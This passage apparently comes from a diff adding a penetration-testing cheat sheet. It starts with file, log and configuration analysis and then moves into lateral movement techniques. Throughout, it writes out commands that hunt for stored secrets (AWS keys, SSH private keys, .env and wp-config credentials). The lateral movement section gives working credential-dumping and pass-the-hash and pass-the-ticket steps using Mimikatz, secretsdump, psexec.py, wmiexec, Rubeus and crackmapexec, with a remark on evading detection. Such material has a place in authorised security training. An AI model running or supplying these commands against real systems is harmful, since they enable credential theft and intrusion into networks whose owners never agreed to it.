+grep -r -i "mongodb://" /var/www /etc /opt 2>/dev/null
+
+# API keys
+grep -r -E "api[_-]?key|apikey" /var/www /home /opt 2>/dev/null
+grep -r -E "api[_-]?secret" /var/www /home /opt 2>/dev/null
+grep -r -E "access[_-]?token" /var/www /home /opt 2>/dev/null
+
+# AWS credentials
+grep -r "aws_access_key_id" / 2>/dev/null
+grep -r "aws_secret_access_key" / 2>/dev/null
+
+# Private SSH keys
+grep -r "BEGIN RSA PRIVATE KEY" / 2>/dev/null
+grep -r "BEGIN OPENSSH PRIVATE KEY" / 2>/dev/null
+```
+
+### File Metadata Analysis
+
+**Windows File Timestamps**
+
+```powershell
+# Recent files (modified in last 7 days)
+forfiles /S /D -7 /C "cmd /c echo @path @fdate @ftime"
+
+# Files modified in specific date range
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | 
+    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } | 
+    Select-Object FullName, LastWriteTime, Length
+
+# Recently accessed files
+Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue | 
+    Where-Object { $_.LastAccessTime -gt (Get-Date).AddHours(-24) } | 
+    Select-Object FullName, LastAccessTime
+```
+
+**Linux File Timestamps**
+
+```bash
+# Files modified in last 7 days
+find / -type f -mtime -7 2>/dev/null
+
+# Files accessed in last 24 hours
+find / -type f -atime -1 2>/dev/null
+
+# Files changed in last hour
+find / -type f -cmin -60 2>/dev/null
+
+# Sort by modification time
+ls -lRt /home | head -50
+
+# Find recently modified config files
+find /etc -type f -mtime -7 -name "*.conf" 2>/dev/null
+```
+
+### Alternate Data Streams (Windows)
+
+**ADS Enumeration**
+
+```powershell
+# List ADS for specific file
+dir /r suspicious_file.txt
+
+# Recursively find ADS
+dir /s /r C:\Users\
+
+# PowerShell ADS detection
+Get-Item -Path C:\Users\*.* -Stream * | Where-Object {$_.Stream -ne ':$DATA'}
+
+# Read ADS content
+more < file.txt:hidden_stream
+
+# Using streams utility
+streams.exe -s C:\Users\
+```
+
+### File Carving and Recovery
+
+**Windows File Recovery**
+
+```powershell
+# Shadow copies
+vssadmin list shadows
+
+# Access shadow copy
+mklink /d C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+
+# Restore file from shadow copy
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\path\to\file C:\restored\
+```
+
+**Linux File Recovery**
+
+```bash
+# Extundelete (ext3/ext4)
+extundelete /dev/sda1 --restore-all
+
+# PhotoRec (multi-format)
+photorec /d /path/to/recovery/ /dev/sda1
+
+# Foremost
+foremost -t all -i /dev/sda1 -o /path/to/output/
+
+# Scalpel
+scalpel /dev/sda1 -o /path/to/output/
+```
+
+### Large File Identification
+
+```bash
+# Windows - Find large files
+forfiles /S /M * /C "cmd /c if @fsize GTR 104857600 echo @path @fsize"
+
+# PowerShell - Files over 100MB
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | 
+    Where-Object { $_.Length -gt 100MB } | 
+    Sort-Object Length -Descending | 
+    Select-Object FullName, @{Name="SizeMB";Expression={[math]::Round($_.Length/1MB,2)}}
+
+# Linux - Find files over 100MB
+find / -type f -size +100M 2>/dev/null -exec ls -lh {} \;
+
+# Top 20 largest files
+find / -type f -exec du -h {} + 2>/dev/null | sort -rh | head -20
+```
+
+---
+
+## Log File Analysis
+
+### Windows Event Logs
+
+**Event Log Locations**
+
+```powershell
+# Event log directory
+C:\Windows\System32\winevt\Logs\
+
+# Key log files
+C:\Windows\System32\winevt\Logs\Security.evtx
+C:\Windows\System32\winevt\Logs\System.evtx
+C:\Windows\System32\winevt\Logs\Application.evtx
+C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx
+```
+
+**Query Event Logs (PowerShell)**
+
+```powershell
+# List all event logs
+Get-EventLog -List
+
+# Security log - Failed logins (Event ID 4625)
+Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4625} | Select-Object TimeGenerated, Message | Format-List
+
+# Successful logins (Event ID 4624)
+
+Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4624} | Select-Object TimeGenerated, Message | Format-List
+
+# Account logon events (Event ID 4648)
+
+Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4648} | Select-Object TimeGenerated, Message
+
+# Special privileges assigned (Event ID 4672) - Admin logins
+
+Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4672} | Select-Object TimeGenerated, Message
+
+# Process creation events (Event ID 4688)
+
+Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688} | Select-Object TimeGenerated, Message
+
+# User account changes (Event IDs 4720, 4722, 4724, 4738)
+
+Get-EventLog -LogName Security | Where-Object {$_.EventID -in @(4720,4722,4724,4738)} | Format-List
+
+````
+
+**Advanced Event Log Filtering**
+```powershell
+# Filter by date range
+$StartDate = (Get-Date).AddDays(-7)
+$EndDate = Get-Date
+Get-EventLog -LogName Security -After $StartDate -Before $EndDate | Where-Object {$_.EventID -eq 4625}
+
+# Export to CSV
+Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4625} | 
+    Select-Object TimeGenerated, EventID, Message | 
+    Export-Csv -Path failed_logins.csv -NoTypeInformation
+
+# Filter by username
+Get-EventLog -LogName Security | Where-Object {$_.Message -like "*username*"}
+
+# Remote computer events
+Get-EventLog -LogName Security -ComputerName remote-pc -Credential (Get-Credential)
+````
+
+**Get-WinEvent (Advanced Queries)**
+
+```powershell
+# PowerShell command execution history
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | 
+    Where-Object {$_.Id -eq 4104} | 
+    Select-Object TimeCreated, Message | Format-List
+
+# RDP connections (Event ID 1149)
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational'; ID=1149}
+
+# Scheduled task creation (Event ID 4698)
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4698} | Format-List
+
+# Service installation (Event ID 7045)
+Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} | Format-List
+
+# Windows Defender detections
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116,1117}
+```
+
+**Event Log Export**
+
+```powershell
+# Export Security log
+wevtutil epl Security C:\security_backup.evtx
+
+# Export all logs
+Get-EventLog -List | ForEach-Object {
+    wevtutil epl $_.Log "C:\logs\$($_.Log).evtx"
+}
+
+# Export to XML
+wevtutil qe Security /f:xml > security.xml
+
+# Export filtered events
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | 
+    Export-Clixml -Path failed_logins.xml
+```
+
+**Event Log Clearing Detection**
+
+```powershell
+# Check for log clearing (Event ID 1102)
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=1102} | Format-List
+
+# Check for suspicious gaps in logs
+Get-EventLog -LogName Security -Newest 1000 | 
+    Select-Object TimeGenerated | 
+    Sort-Object TimeGenerated
+```
+
+### Linux System Logs
+
+**Common Log Locations**
+
+```bash
+/var/log/auth.log          # Authentication (Debian/Ubuntu)
+/var/log/secure            # Authentication (RHEL/CentOS)
+/var/log/syslog            # System messages
+/var/log/messages          # General messages
+/var/log/kern.log          # Kernel logs
+/var/log/apache2/          # Apache logs
+/var/log/nginx/            # Nginx logs
+/var/log/mysql/            # MySQL logs
+/var/log/postgresql/       # PostgreSQL logs
+/var/log/cron              # Cron job logs
+/var/log/boot.log          # Boot messages
+/var/log/dmesg             # Hardware/driver messages
+~/.bash_history            # User command history
+/var/log/wtmp              # Login records (binary)
+/var/log/btmp              # Failed login attempts (binary)
+/var/log/lastlog           # Last login info (binary)
+```
+
+**Authentication Log Analysis**
+
+```bash
+# Failed SSH login attempts
+grep "Failed password" /var/log/auth.log
+
+# Successful SSH logins
+grep "Accepted password\|Accepted publickey" /var/log/auth.log
+
+# SSH connections by IP
+grep "sshd" /var/log/auth.log | grep "Accepted" | awk '{print $1, $2, $3, $11}'
+
+# Sudo command usage
+grep "sudo" /var/log/auth.log | grep "COMMAND"
+
+# User additions
+grep "useradd" /var/log/auth.log
+
+# Failed sudo attempts
+grep "sudo.*authentication failure" /var/log/auth.log
+
+# Root login attempts
+grep "root" /var/log/auth.log | grep "Failed\|Accepted"
+```
+
+**System Log Analysis**
+
+```bash
+# Recent system errors
+grep -i "error\|fail\|critical" /var/log/syslog | tail -50
+
+# Service start/stop events
+grep -E "started|stopped" /var/log/syslog
+
+# Kernel messages
+dmesg | grep -i "error\|warning\|fail"
+
+# USB device connections
+grep -i "usb" /var/log/syslog
+
+# Network interface changes
+grep -i "link\|interface" /var/log/syslog
+```
+
+**Login History Analysis**
+
+```bash
+# Current logged-in users
+w
+who
+
+# Last logged-in users
+last -20
+
+# Last login per user
+lastlog
+
+# Failed login attempts
+lastb
+
+# Login history from wtmp
+last -f /var/log/wtmp
+
+# Specific user login history
+last username
+
+# Reboot history
+last reboot
+```
+
+**Command History Analysis**
+
+```bash
+# Current user bash history
+cat ~/.bash_history
+
+# All users' bash history
+find /home -name ".bash_history" -exec cat {} \; 2>/dev/null
+
+# Root bash history
+cat /root/.bash_history
+
+# History with timestamps (if enabled)
+HISTTIMEFORMAT="%F %T " history
+
+# Find sensitive commands
+grep -E "password|passwd|ssh|mysql|wget|curl" ~/.bash_history
+
+# Find privilege escalation attempts
+grep -E "sudo|su |pkexec" ~/.bash_history
+```
+
+### Web Server Logs
+
+**Apache Access Log Analysis**
+
+```bash
+# Access log location
+/var/log/apache2/access.log
+
+# Top 20 IP addresses
+cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
+
+# Top requested URLs
+cat access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20
+
+# 404 errors
+grep " 404 " access.log
+
+# 500 errors
+grep " 5[0-9][0-9] " access.log
+
+# POST requests
+grep "POST" access.log
+
+# Requests by specific IP
+grep "192.168.1.100" access.log
+
+# Requests to admin pages
+grep "/admin\|/wp-admin\|/phpmyadmin" access.log
+
+# Suspicious user agents
+grep -i "sqlmap\|nikto\|nmap\|masscan\|metasploit" access.log
+
+# Large response sizes (potential data exfiltration)
+awk '{if ($10 > 1000000) print $0}' access.log
+```
+
+**Apache Error Log Analysis**
+
+```bash
+# Error log location
+/var/log/apache2/error.log
+
+# PHP errors
+grep "PHP" error.log
+
+# Permission denied errors
+grep "Permission denied" error.log
+
+# File not found errors
+grep "File does not exist" error.log
+
+# Recent errors (last 100)
+tail -100 error.log
+
+# Critical errors
+grep -i "critical\|alert\|emergency" error.log
+```
+
+**Nginx Access Log Analysis**
+
+```bash
+# Nginx log location
+/var/log/nginx/access.log
+
+# Parse Nginx logs (JSON format if configured)
+cat access.log | jq '.'
+
+# Top referrers
+cat access.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20
+
+# Bandwidth usage by IP
+awk '{ip[$1]+=$$10} END {for (i in ip) print ip[i], i}' access.log | sort -rn | head -20
+
+# Request methods distribution
+awk '{print $6}' access.log | sort | uniq -c
+
+# HTTP status code distribution
+awk '{print $9}' access.log | sort | uniq -c
+
+# Slow requests (response time > 5 seconds)
+awk '{if ($NF > 5.0) print $0}' access.log
+```
+
+### Application Logs
+
+**Database Logs**
+
+**MySQL/MariaDB**
+
+```bash
+# Error log
+/var/log/mysql/error.log
+
+# General query log (if enabled)
+/var/log/mysql/mysql.log
+
+# Slow query log
+/var/log/mysql/mysql-slow.log
+
+# Analyze slow queries
+cat mysql-slow.log | grep "Query_time" | sort -rn | head -20
+
+# Failed connections
+grep "Access denied" /var/log/mysql/error.log
+
+# Connection from specific host
+grep "192.168.1.100" /var/log/mysql/mysql.log
+```
+
+**PostgreSQL**
+
+```bash
+# PostgreSQL log directory
+/var/log/postgresql/
+
+# Connection attempts
+grep "connection" /var/log/postgresql/postgresql-*.log
+
+# Failed authentication
+grep "FATAL.*password authentication failed" /var/log/postgresql/postgresql-*.log
+
+# Executed queries (if logging enabled)
+grep "statement:" /var/log/postgresql/postgresql-*.log
+
+# Error messages
+grep "ERROR" /var/log/postgresql/postgresql-*.log
+```
+
+**Application-Specific Logs**
+
+**Docker Logs**
+
+```bash
+# Container logs
+docker logs <container_id>
+
+# Follow logs in real-time
+docker logs -f <container_id>
+
+# Logs with timestamps
+docker logs -t <container_id>
+
+# Last 100 lines
+docker logs --tail 100 <container_id>
+
+# Docker daemon logs
+journalctl -u docker.service
+```
+
+**Systemd Journal**
+
+```bash
+# View all journal entries
+journalctl
+
+# Follow journal in real-time
+journalctl -f
+
+# Filter by service
+journalctl -u ssh.service
+journalctl -u apache2.service
+
+# Filter by priority (0=emerg, 3=err, 6=info)
+journalctl -p err
+
+# Filter by time
+journalctl --since "2024-01-01 00:00:00"
+journalctl --since "1 hour ago"
+journalctl --since today
+
+# Filter by specific user
+journalctl _UID=1000
+
+# Boot messages
+journalctl -b
+
+# Export to file
+journalctl > system_journal.txt
+```
+
+### Log Correlation and Analysis
+
+**Automated Log Analysis Script**
+
+```bash
+#!/bin/bash
+
+echo "[*] Security Log Analysis"
+echo "========================="
+
+echo -e "\n[+] Failed SSH Login Attempts:"
+grep "Failed password" /var/log/auth.log 2>/dev/null | awk '{print $1, $2, $3, $9, $11}' | sort | uniq -c | sort -rn | head -10
+
+echo -e "\n[+] Successful SSH Logins:"
+grep "Accepted password\|Accepted publickey" /var/log/auth.log 2>/dev/null | awk '{print $1, $2, $3, $9, $11}' | tail -10
+
+echo -e "\n[+] Sudo Command Execution:"
+grep "sudo.*COMMAND" /var/log/auth.log 2>/dev/null | tail -10
+
+echo -e "\n[+] User Account Changes:"
+grep -E "useradd|usermod|userdel|groupadd" /var/log/auth.log 2>/dev/null | tail -10
+
+echo -e "\n[+] Service Failures:"
+grep -i "failed\|failure" /var/log/syslog 2>/dev/null | grep -v "audit" | tail -10
+
+echo -e "\n[+] Suspicious Web Requests:"
+if [ -f /var/log/apache2/access.log ]; then
+    grep -E "\.\.\/|union|select|exec|cmd=|bash|sh|passwd|shadow" /var/log/apache2/access.log | tail -10
+fi
+
+echo -e "\n[+] Current Active Connections:"
+ss -tunap | grep ESTABLISHED
+
+echo -e "\n[+] Recently Modified Files in /etc:"
+find /etc -type f -mtime -1 2>/dev/null
+
+echo "[*] Analysis Complete"
+```
+
+---
+
+## Configuration File Analysis
+
+### Web Application Configuration Files
+
+**PHP Configuration**
+
+```bash
+# php.ini locations
+/etc/php/7.4/apache2/php.ini
+/etc/php/7.4/cli/php.ini
+/etc/php.ini
+
+# Extract sensitive settings
+grep -E "display_errors|expose_php|allow_url_fopen|allow_url_include|disable_functions" /etc/php/*/apache2/php.ini
+
+# Find all php.ini files
+find / -name "php.ini" 2>/dev/null
+
+# Check for dangerous configurations
+grep "allow_url_include = On" /etc/php/*/apache2/php.ini
+grep "disable_functions =" /etc/php/*/apache2/php.ini
+```
+
+**Apache Configuration**
+
+```bash
+# Apache config locations
+/etc/apache2/apache2.conf
+/etc/httpd/conf/httpd.conf
+/etc/apache2/sites-enabled/
+
+# Extract virtual hosts
+grep -r "VirtualHost" /etc/apache2/sites-enabled/
+
+# Find .htaccess files
+find /var/www -name ".htaccess" 2>/dev/null
+
+# Check for exposed directories
+grep -r "DirectoryIndex" /etc/apache2/
+
+# Authentication files
+grep -r "AuthUserFile\|AuthGroupFile" /etc/apache2/
+
+# Analyze .htaccess for credentials
+find /var/www -name ".htaccess" -exec grep -H "Auth" {} \;
+```
+
+**Nginx Configuration**
+
+```bash
+# Nginx config location
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/
+
+# Extract server blocks
+grep -A 20 "server {" /etc/nginx/sites-enabled/*
+
+# Find PHP configurations
+grep -r "fastcgi_pass\|php-fpm" /etc/nginx/
+
+# Check for password files
+grep -r "auth_basic_user_file" /etc/nginx/
+
+# SSL certificate locations
+grep -r "ssl_certificate" /etc/nginx/
+```
+
+**IIS Configuration (Windows)**
+
+```powershell
+# IIS config location
+C:\Windows\System32\inetsrv\config\applicationHost.config
+
+# Web.config files
+dir /s /b C:\inetpub\wwwroot\web.config
+
+# Extract connection strings
+findstr /si "connectionstring" C:\inetpub\wwwroot\web.config
+
+# Authentication settings
+findstr /si "authentication" C:\Windows\System32\inetsrv\config\applicationHost.config
+
+# Virtual directories
+Get-WebVirtualDirectory
+
+# Application pools
+Get-IISAppPool
+```
+
+### Database Configuration Files
+
+**MySQL/MariaDB Configuration**
+
+```bash
+# MySQL config location
+/etc/mysql/my.cnf
+/etc/my.cnf
+~/.my.cnf
+
+# Extract credentials
+grep -E "user|password" /etc/mysql/my.cnf
+grep -E "user|password" ~/.my.cnf
+
+# Check for insecure configurations
+grep "skip-grant-tables" /etc/mysql/my.cnf
+grep "bind-address" /etc/mysql/my.cnf
+
+# Find all MySQL config files
+find / -name "my.cnf" 2>/dev/null
+```
+
+**PostgreSQL Configuration**
+
+```bash
+# PostgreSQL config
+/etc/postgresql/*/main/postgresql.conf
+/var/lib/pgsql/data/postgresql.conf
+
+# Authentication config
+/etc/postgresql/*/main/pg_hba.conf
+
+# Extract connection settings
+grep "listen_addresses" /etc/postgresql/*/main/postgresql.conf
+grep "port" /etc/postgresql/*/main/postgresql.conf
+
+# Check authentication methods
+cat /etc/postgresql/*/main/pg_hba.conf
+
+# Password file
+~/.pgpass
+```
+
+**MongoDB Configuration**
+
+```bash
+# MongoDB config
+/etc/mongod.conf
+
+# Extract settings
+grep -E "bindIp|port|auth" /etc/mongod.conf
+
+# Check if authentication is enabled
+grep "security:" /etc/mongod.conf
+
+# MongoDB connection strings in apps
+grep -r "mongodb://" /var/www /opt 2>/dev/null
+```
+
+**Redis Configuration**
+
+```bash
+# Redis config
+/etc/redis/redis.conf
+
+# Extract password
+grep "requirepass" /etc/redis/redis.conf
+
+# Check bind address
+grep "bind" /etc/redis/redis.conf
+
+# Dangerous commands
+grep "rename-command" /etc/redis/redis.conf
+```
+
+### Application Framework Configuration
+
+**Django (Python)**
+
+```bash
+# Settings file locations
+find / -name "settings.py" 2>/dev/null
+find / -name "local_settings.py" 2>/dev/null
+
+# Extract database credentials
+grep -A 10 "DATABASES" settings.py
+
+# Secret key
+grep "SECRET_KEY" settings.py
+
+# Debug mode
+grep "DEBUG" settings.py
+
+# Allowed hosts
+grep "ALLOWED_HOSTS" settings.py
+```
+
+**Flask (Python)**
+
+```bash
+# Config files
+find / -name "config.py" 2>/dev/null
+find / -name "instance/config.py" 2>/dev/null
+
+# Extract secrets
+grep -E "SECRET_KEY|DATABASE_URI|SQLALCHEMY" config.py
+
+# Debug mode
+grep "DEBUG" config.py
+```
+
+**Ruby on Rails**
+
+```bash
+# Database config
+find / -name "database.yml" 2>/dev/null
+
+# Credentials
+cat config/database.yml
+
+# Secrets
+find / -name "secrets.yml" 2>/dev/null
+cat config/secrets.yml
+
+# Master key (Rails 5.2+)
+cat config/master.key
+
+# Encrypted credentials
+cat config/credentials.yml.enc
+```
+
+**Node.js/Express**
+
+```bash
+# Environment files
+find / -name ".env" 2>/dev/null
+find / -name ".env.local" 2>/dev/null
+find / -name ".env.production" 2>/dev/null
+
+# Extract credentials
+cat .env
+cat .env.local
+
+# Package configuration
+cat package.json
+
+# Node modules with credentials
+find /var/www -name "config.js" 2>/dev/null
+```
+
+**Laravel (PHP)**
+
+```bash
+# Environment file
+find / -name ".env" -path "*/laravel/*" 2>/dev/null
+
+# Extract configuration
+cat .env | grep -E "DB_|APP_KEY|MAIL_|AWS_"
+
+# Configuration cache
+cat bootstrap/cache/config.php
+
+# Database config
+cat config/database.php
+```
+
+**WordPress**
+
+```bash
+# wp-config.php location
+find / -name "wp-config.php" 2>/dev/null
+
+# Extract database credentials
+grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" wp-config.php
+
+# Authentication keys and salts
+grep "AUTH_KEY\|SECURE_AUTH_KEY\|LOGGED_IN_KEY" wp-config.php
+
+# Database prefix
+grep "table_prefix" wp-config.php
+
+# Backup config files
+find / -name "wp-config.php.bak" 2>/dev/null
+find / -name "wp-config.php.old" 2>/dev/null
+```
+
+### Network Service Configuration
+
+**SSH Configuration**
+
+```bash
+# SSH server config
+/etc/ssh/sshd_config
+
+# Check for weak configurations
+grep "PermitRootLogin" /etc/ssh/sshd_config
+grep "PasswordAuthentication" /etc/ssh/sshd_config
+grep "PubkeyAuthentication" /etc/ssh/sshd_config
+grep "PermitEmptyPasswords" /etc/ssh/sshd_config
+
+# Authorized keys
+cat ~/.ssh/authorized_keys
+find /home -name "authorized_keys" 2>/dev/null
+
+# Known hosts
+cat ~/.ssh/known_hosts
+```
+
+**FTP Configuration**
+
+```bash
+# vsftpd config
+/etc/vsftpd.conf
+
+# ProFTPD config
+/etc/proftpd/proftpd.conf
+
+# Check for anonymous access
+grep "anonymous_enable" /etc/vsftpd.conf
+
+# User list
+cat /etc/vsftpd.userlist
+cat /etc/vsftpd.chroot_list
+```
+
+**Samba Configuration**
+
+```bash
+# Samba config
+/etc/samba/smb.conf
+
+# Extract shares
+grep -A 10 "\[.*\]" /etc/samba/smb.conf
+
+# Check for guest access
+grep "guest ok\|map to guest" /etc/samba/smb.conf
+
+# User database
+pdbedit -L -v
+```
+
+**DNS Configuration**
+
+```bash
+# BIND config
+/etc/bind/named.conf
+/etc/named.conf
+
+# Zone files
+/var/named/
+/etc/bind/zones/
+
+# Extract zone information
+cat /etc/bind/named.conf.local
+
+# Check for zone transfers
+grep "allow-transfer" /etc/bind/named.conf*
+```
+
+### Cloud and Container Configuration
+
+**Docker Configuration**
+
+```bash
+# Docker daemon config
+/etc/docker/daemon.json
+
+# Docker compose files
+find / -name "docker-compose.yml" 2>/dev/null
+
+# Extract environment variables
+grep -A 50 "environment:" docker-compose.yml
+
+# Secrets in compose
+grep "secrets:" docker-compose.yml
+
+# Volume mounts
+grep "volumes:" docker-compose.yml
+
+# Dockerfile search
+find / -name "Dockerfile" 2>/dev/null
+
+# Extract credentials from Dockerfile
+grep -E "ENV|ARG|USER|PASSWORD" Dockerfile
+```
+
+**Kubernetes Configuration**
+
+```bash
+# Kubeconfig
+~/.kube/config
+/etc/kubernetes/admin.conf
+
+# Extract cluster information
+kubectl config view
+
+# Secrets
+kubectl get secrets --all-namespaces
+
+# ConfigMaps
+kubectl get configmaps --all-namespaces
+
+# Service accounts
+kubectl get serviceaccounts --all-namespaces
+```
+
+**AWS Configuration**
+
+```bash
+# AWS CLI credentials
+~/.aws/credentials
+~/.aws/config
+
+# Extract access keys
+cat ~/.aws/credentials
+
+# S3 bucket config
+find / -name ".s3cfg" 2>/dev/null
+
+# Terraform state (may contain secrets)
+find / -name "terraform.tfstate" 2>/dev/null
+cat terraform.tfstate | grep -i "password\|secret\|key"
+```
+
+### Configuration File Search Script
+
+```bash
+#!/bin/bash
+
+echo "[*] Configuration File Analysis"
+echo "================================"
+
+# Web configs
+echo -e "\n[+] Web Application Configs:"
+find / -name "web.config" -o -name "wp-config.php" -o -name ".env" 2>/dev/null | head -20
+
+# Database configs
+echo -e "\n[+] Database Configs:"
+find / -name "my.cnf" -o -name "postgresql.conf" -o -name "mongod.conf" 2>/dev/null
+
+# SSH configs
+echo -e "\n[+] SSH Configurations:"
+find /home -name "authorized_keys" -o -name "id_rsa" -o -name "id_rsa.pub" 2>/dev/null
+
+# Application configs
+echo -e "\n[+] Application Configs:"
+find / -name "settings.py" -o -name "config.php" -o -name "application.properties" 2>/dev/null | head -20
+
+# Docker configs
+echo -e "\n[+] Docker/Container Configs:"
+find / -name "docker-compose.yml" -o -name "Dockerfile" 2>/dev/null | head -10
+
+# AWS configs
+echo -e "\n[+] Cloud Provider Configs:"
+ls -la ~/.aws/ ~/.azure/ ~/.config/gcloud/ 2>/dev/null
+
+echo -e "\n[*] Analysis Complete"
+```
+
+---
+
+## Important Related Topics
+
+- **Memory Dump Analysis** for extracting credentials from RAM
+- **Network Traffic Analysis** using packet captures during post-exploitation
+- **Scheduled Task/Cron Job Analysis** for persistence mechanisms
+- **Registry Analysis (Windows)** for additional credential stores and configuration
+- **Certificate and Key Store Analysis** for PKI infrastructure credentials
+- **Cloud Metadata Service Exploitation** (AWS, Azure, GCP)
+- **Credential Dumping from Active Directory** (DCSync, DCShadow)
+- **Container Escape Techniques** and host filesystem access
+
+---
+
+# Lateral Movement Techniques
+
+Lateral movement allows attackers to pivot from an initially compromised host to other systems within a network, escalating access and reaching high-value targets. These techniques leverage stolen credentials, session tokens, and remote execution capabilities.
+
+## Pass-the-Hash Lateral Movement
+
+Pass-the-Hash (PtH) exploits NTLM authentication by using password hashes directly instead of plaintext passwords. Windows systems authenticate using NT hash values, making plaintext passwords unnecessary for lateral movement.
+
+### Technical Foundation
+
+NTLM authentication uses challenge-response protocol where the NT hash (MD4 of password) is used to encrypt a server challenge. With the hash, attackers can authenticate without cracking passwords.
+
+**Hash Format:**
+
+- LM Hash: `AAD3B435B51404EEAAD3B435B51404EE` (deprecated, often disabled)
+- NT Hash: `32-character hexadecimal string`
+- Format: `username:RID:LM_hash:NT_hash:::`
+
+### Extracting Hashes
+
+**Using Mimikatz:**
+
+```cmd
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+**Using secretsdump.py (Impacket):**
+
+```bash
+secretsdump.py 'DOMAIN/user:password@target_ip'
+secretsdump.py -hashes :NT_hash 'DOMAIN/user@target_ip'
+secretsdump.py -sam -security -system LOCAL
+```
+
+**Dumping from Registry (requires SYSTEM):**
+
+```bash
+reg save HKLM\SAM sam.save
+reg save HKLM\SYSTEM system.save
+secretsdump.py -sam sam.save -system system.save LOCAL
+```
+
+### Pass-the-Hash Execution Methods
+
+**PsExec with Impacket:**
+
+```bash
+psexec.py -hashes :NT_hash DOMAIN/username@target_ip
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
+
+# Execute specific command
+psexec.py -hashes :NT_hash 'DOMAIN/user@target' 'whoami'
+```
+
+**WMIExec (stealthier, no SMB writes):**
+
+```bash
+wmiexec.py -hashes :NT_hash DOMAIN/username@target_ip
+wmiexec.py -hashes :NT_hash administrator@192.168.1.10 'ipconfig'
+```
+
+**SMBExec (alternative to PsExec):**
+
+```bash
+smbexec.py -hashes :NT_hash DOMAIN/username@target_ip
+```
+
+**Evil-WinRM with Hash:**
+
+```bash
+evil-winrm -i target_ip -u username -H NT_hash
+```
+
+**CrackMapExec for Multiple Targets:**
+
+```bash
+crackmapexec smb 192.168.1.0/24 -u administrator -H NT_hash
+
+# Execute commands
+crackmapexec smb 192.168.1.10 -u administrator -H NT_hash -x 'whoami'
+
+# Dump SAM
+crackmapexec smb 192.168.1.10 -u administrator -H NT_hash --sam
+```
+
+**Mimikatz PtH (from Windows):**
+
+```cmd
+sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:NT_hash /run:powershell.exe
+```
+
+### Detection Evasion Considerations
+
+[Inference] PtH generates Event ID 4624 (Logon Type 3) with NTLM authentication. WMIExec creates fewer artifacts than PsExec since it doesn't write to disk.
+
+## Pass-the-Ticket Lateral Movement
+
+Pass-the-Ticket (PtT) exploits Kerberos authentication by stealing and reusing Ticket Granting Tickets (TGT) or Service Tickets (TGS). This technique is specific to Active Directory environments.
+
+### Kerberos Ticket Fundamentals
+
+**Ticket Types:**
+
+- **TGT (Ticket Granting Ticket):** Issued by KDC, used to request service tickets
+- **TGS (Ticket Granting Service):** Service-specific tickets for accessing resources
+
+**Ticket Formats:**
+
+- `.kirbi` - Mimikatz format
+- `.ccache` - Linux/Unix format
+
+### Extracting Tickets
+
+**Mimikatz Ticket Extraction:**
+
+```cmd
+mimikatz.exe
+privilege::debug
+
+# Export all tickets
+sekurlsa::tickets /export
+
+# List tickets in memory
+sekurlsa::tickets
+
+# Specific user tickets
+kerberos::list /export
+```
+
+**Rubeus (Windows .NET tool):**
+
+```cmd
+# Dump all tickets
+Rubeus.exe dump
+
+# Dump specific user
+Rubeus.exe dump /user:administrator /nowrap
+
+# Monitor for new tickets
+Rubeus.exe monitor /interval:5
+```
+
+**Linux Ticket Extraction:**
+
+```bash
+# Current user's ticket cache
+klist
+cp /tmp/krb5cc_* ./ticket.ccache
+
+# From keytab files
+klist -k /etc/krb5.keytab
+```
+
+### Ticket Injection and Usage
+
+**Mimikatz Ticket Injection:**
+
+```cmd
+# Inject .kirbi ticket
+kerberos::ptt ticket.kirbi
+
+# Verify injection
+klist
+
+# Use injected ticket
+dir \\target_dc\C$
+```
+
+**Rubeus Ticket Operations:**
+
+```cmd
+# Inject ticket (Base64 encoded)
+Rubeus.exe ptt /ticket:base64_ticket_string
+
+# Create sacrificial logon session
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DOMAIN /username:user /password:FakePass /ticket:base64_ticket
+
+# Request TGS with TGT
+Rubeus.exe asktgs /ticket:base64_TGT /service:cifs/target.domain.local /ptt
+```
+
+**Linux PtT with Impacket:**
+
+```bash
+# Set ticket environment variable
+export KRB5CCNAME=/path/to/ticket.ccache
+
+# Use ticket with Impacket
+psexec.py -k -no-pass DOMAIN/user@target.domain.local
+wmiexec.py -k -no-pass DOMAIN/user@target.domain.local
+smbexec.py -k -no-pass DOMAIN/user@target.domain.local
+
+# Sync time (critical for Kerberos)
+sudo ntpdate -s dc_ip
+sudo timedatectl set-ntp 0
+sudo date -s "$(ssh user@dc_ip date)"
+```
+
+**Ticket Format Conversion:**
+
+```bash
+# .kirbi to .ccache
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# .ccache to .kirbi
+impacket-ticketConverter ticket.ccache ticket.kirbi
+```
+
+### Overpass-the-Hash (Pass-the-Key)
+
+Using NTLM hash or AES keys to request Kerberos TGT:
+
